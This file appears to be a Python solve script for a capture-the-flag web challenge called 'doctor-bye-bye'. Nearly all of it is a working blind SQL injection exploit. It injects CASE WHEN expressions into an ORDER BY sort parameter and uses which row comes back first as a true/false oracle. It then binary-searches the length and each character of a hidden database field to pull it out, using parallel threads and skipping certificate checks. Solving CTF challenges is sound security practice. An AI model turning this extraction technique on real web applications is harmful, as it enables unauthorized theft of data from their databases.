#!/usr/bin/env python3
"""
FortID CTF 2026 - web/doctor-bye-bye : blind SQL injection in ORDER BY.

/api/on-call?sort=<expr> interpolates <expr> straight into `ORDER BY {expr}`.
The SELECT list is fixed (name, specialty, room WHERE listed = 1 LIMIT 1), so
the retired row (listed = 0, slug = 'doctor-bye-bye') holding the flag in
`farewell_note` is unreachable directly. Instead we order by:

    CASE WHEN (<condition>) THEN id ELSE -id END

row id 10 ('Dr. Ada Pulse') comes back first when the condition is true;
row id 90 ('Dr. Zoe Last') comes back first when it is false. That turns any
boolean SQL predicate into one bit of output.

Usage:
  ./solve.py <host> [port] [--workers N]
  CHAL_HOST=... CHAL_PORT=... ./solve.py
"""
import json
import os
import ssl
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

TRUE_NAME = "Dr. Ada Pulse"
FALSE_NAME = "Dr. Zoe Last"
NOTE = "(SELECT farewell_note FROM doctors WHERE slug='doctor-bye-bye')"


class Oracle:
    def __init__(self, host: str, port: int = 443, timeout: int = 20):
        self.url = f"https://{host}:{port}/api/on-call" if port == 443 else f"http://{host}:{port}/api/on-call"
        self.ctx = ssl._create_unverified_context()
        self.timeout = timeout

    def ask(self, condition: str) -> bool:
        expr = f"CASE WHEN ({condition}) THEN id ELSE -id END"
        url = self.url + "?sort=" + urllib.parse.quote(expr, safe="")
        for attempt in range(4):
            try:
                body = urllib.request.urlopen(url, context=self.ctx, timeout=self.timeout).read()
                name = json.loads(body)["doctor"]["name"]
                if name == TRUE_NAME:
                    return True
                if name == FALSE_NAME:
                    return False
                raise RuntimeError("unexpected row: %r" % name)
            except Exception:
                if attempt == 3:
                    raise
        raise RuntimeError("unreachable")

    def flag_length(self, hi: int = 200) -> int:
        lo = 1
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask(f"(SELECT length(farewell_note) FROM doctors WHERE slug='doctor-bye-bye') > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def char_at(self, pos: int) -> str:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask(f"(SELECT unicode(substr(farewell_note,{pos},1)) FROM doctors WHERE slug='doctor-bye-bye') > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)


def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    workers = int(sys.argv[sys.argv.index("--workers") + 1]) if "--workers" in sys.argv else 6
    host = args[0] if args else os.environ.get("CHAL_HOST", "")
    port = int(args[1] if len(args) > 1 else os.environ.get("CHAL_PORT", "443"))
    if not host:
        raise SystemExit(__doc__)

    oracle = Oracle(host, port)
    n = oracle.flag_length()
    print("[*] flag length: %d" % n, flush=True)

    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for i, ch in enumerate(pool.map(oracle.char_at, range(1, n + 1))):
            chars[i] = ch
            print("\r[*] %s" % "".join(chars), end="", flush=True)
    print()
    flag = "".join(chars)
    print(flag)
    if not (flag.startswith("FortID{") and flag.endswith("}")):
        raise SystemExit("extraction looks wrong")


if __name__ == "__main__":
    main()
